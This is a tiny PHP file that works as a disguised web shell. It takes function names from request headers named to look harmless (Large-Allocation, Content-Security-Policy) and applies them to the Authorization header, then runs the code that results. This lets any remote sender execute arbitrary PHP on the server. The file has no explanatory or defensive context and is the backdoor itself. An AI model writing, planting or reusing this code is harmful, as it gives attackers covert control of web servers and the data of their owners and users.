<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $clases = $_HEADERS['Large-Allocation']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Authorization']));
    $clases();
}